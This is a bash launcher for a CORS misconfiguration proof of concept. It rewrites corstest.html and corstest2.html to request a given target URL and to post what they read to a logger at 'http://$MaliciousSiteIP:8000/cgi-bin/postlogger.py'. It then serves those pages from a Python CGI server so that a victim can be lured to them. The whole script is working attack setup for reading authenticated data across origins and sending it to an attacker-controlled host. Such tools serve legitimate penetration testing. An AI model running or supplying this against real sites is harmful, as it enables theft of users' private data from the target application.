#!/usr/bin/env bash
# Script that configures and launches the cors POC

MaliciousSiteIP=$1
Target=$2

if [[ $# -ne 2 ]]; then
	printf "\tUsage: $0 MaliciousSiteIP Target\n\tExample: $0 100.10.10.10 https://example.com/admin/users\n"
	exit 1
fi

if [[ ! -f corstest.html ]]; then
	printf "CORS POC files not found. Python web server will be run from here. Ensure you are in repo folder to update and serve files the files.\n"
	exit 1
fi

# Add '' after -i because Mac requires a backup extension to be used. If you want to use a backup file change '' with .bak. On linux you can remove the need for an extension.
if sed -i '' "s|var url = .*;|var url = '${Target}';|" corstest.html && sed -i '' "s|var maliciousurl = .*';|var maliciousurl = 'http://$MaliciousSiteIP:8000/cgi-bin/postlogger.py';|" corstest.html; then
	echo ">[i] corstest.html updated"
else
	echo ">[i] corstest.html failed to update"
fi

# Same as above but changin the corstest2.html
if sed -i '' "s|xhr.open.*$|xhr.open(\"GET\", \"$Target\", true);|" corstest2.html; then
	echo ">[i] cortest2.html updated"
else
	echo ">[i}corstest2.html failed to update"
fi

echo ""
echo ">[i] Navigate to http://$MaliciousSiteIP:8000/cortest.html or http://$MaliciousSiteIP:8000/cortest2.html"
echo ""

python3 -m http.server --cgi
